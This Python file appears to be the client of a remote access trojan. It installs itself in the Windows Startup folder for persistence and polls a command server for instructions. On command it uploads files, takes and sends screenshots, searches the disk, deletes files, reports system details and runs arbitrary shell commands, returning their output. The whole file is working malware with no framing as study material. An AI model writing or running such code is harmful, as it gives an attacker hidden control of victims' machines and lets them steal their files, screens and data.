import requests
import subprocess 
import time
import os
from datetime import datetime
import pyautogui
import tempfile
import platform
import shutil
from math import ceil

save = tempfile.mkdtemp("screen")
SERVER_IP_ADDRESS = "http://127.0.0.1:5000/"
if SERVER_IP_ADDRESS[-1] != '/':
    SERVER_IP_ADDRESS += '/'
response = ""

if platform.system() == 'Windows':
    from win32com.client import Dispatch
    username = os.getlogin()
    destination = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(username)
    if 'Client.pyw - Shortcut.lnk' not in os.listdir(destination):
        path = os.path.join(destination, "Client.pyw - Shortcut.lnk")
        target = "" + os.getcwd() + r"\Client.pyw"
        icon = "" + os.getcwd() + r"\Client.pyw"
        for files in os.listdir():
            if files == "Client.pyw":
                shell = Dispatch('WScript.Shell')
                shortcut = shell.CreateShortCut(path)
                shortcut.Targetpath = target
                shortcut.IconLocation = icon
                shortcut.save()

while True:
    try:
        params = {"path": os.getcwd()}
        req = requests.get(SERVER_IP_ADDRESS, params)
        response = req.text
    except Exception as e:
        pass
    else:
        try:
            if 'terminate' == response.strip().lower():
                shutil.rmtree(save)
                quit()
                break

            elif 'grab' in response and response.startswith('grab'):
                path = response[5:]

                if os.path.exists(path):
                    if '\\' in path:
                        fileName = path.split("\\")[-1]
                    else:
                        fileName = path
                    url = SERVER_IP_ADDRESS + 'store'
                    fo = open(path, 'rb')
                    files = {'file': fo}
                    r = requests.post(url, files = files)
                    fo.close()
                else:
                    post_response = requests.post(url = SERVER_IP_ADDRESS, data = '[-] Not able to find the file !')

            elif 'snapshot' == response.strip().lower():
                screenshot = pyautogui.screenshot()
                screenshot_name = r'\Screenshot_' + datetime.now().strftime('%d-%m-%Y_%H-%M-%S') + '.png'
                screenshot.save(save + screenshot_name)
                url = SERVER_IP_ADDRESS + 'store'
                fo = open(save + screenshot_name, 'rb')
                files = {'file': fo}
                r = requests.post(url, files = files)
                fo.close()
                
            elif 'search' in response and response.startswith('search'):
                response = response[7:]
                path, ext = response.split('*')
                list = ''
                for dirpath, dirname, files in os.walk(path):
                    for file in files:
                        if file.endswith(ext):
                            list = list + '\n' + os.path.join(dirpath, file)
                r = requests.post(SERVER_IP_ADDRESS, data = list)

            elif 'cd' in response and response.startswith('cd'):
                if len(response) == 2:
                    r = requests.post(SERVER_IP_ADDRESS, data = "Enter with Location")
                else:
                    directory = response[3:]
                    if directory == "Desktop":
                        os.chdir('C:\\Users\\' + username + '\\' + directory)
                    else:
                        os.chdir(directory)

            elif 'remove' in response and response.startswith('remove'):
                if len(response) == 6:
                    r = requests.post(SERVER_IP_ADDRESS, data = "Enter filename after remove")
                else:
                    filename = response[7:]
                    if os.path.exists(filename):
                        os.remove(filename)
                    else:
                        r = requests.post(SERVER_IP_ADDRESS, data= "The file does not exist")
            
            elif "ls" == response.lower().strip():
                all_files = []
                for i in os.scandir():
                    date_time_stamp = datetime.fromtimestamp(i.stat().st_mtime).strftime('%d-%m-%Y %H:%M')
                    if os.path.isdir(i):
                        all_files.append("{:<90} {}".format(i.name+"/", date_time_stamp))
                    else:
                        size = str(ceil(i.stat().st_size/1024))+" KB"
                        all_files.append("{:<90} {} {:>15}".format(i.name, date_time_stamp, size))
                list_of_files = "\n".join(all_files)
                r = requests.post(SERVER_IP_ADDRESS, data= list_of_files)

            elif 'system specs' == response.lower().strip():
                system_specs = 'System      : {}\nNode        : {}\nRelease     : {}\nVersion     : {}\n'\
                    'Machine     : {}\nProcessor   : {}\nInterpreter : {}'    
                system_specs = system_specs.format(
                                        platform.system(), platform.node(),
                                        platform.release(), platform.version(),
                                        platform.machine(), platform.processor(),
                                        platform.architecture()[0]
                                        )
                r = requests.post(SERVER_IP_ADDRESS, data= system_specs)

            else:
                CMD =  subprocess.Popen(response,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
                post_response = requests.post(url=SERVER_IP_ADDRESS, data=CMD.stdout.read()) 
                post_response = requests.post(url=SERVER_IP_ADDRESS, data=CMD.stderr.read())
        except Exception as e:
            pass

    time.sleep(1)
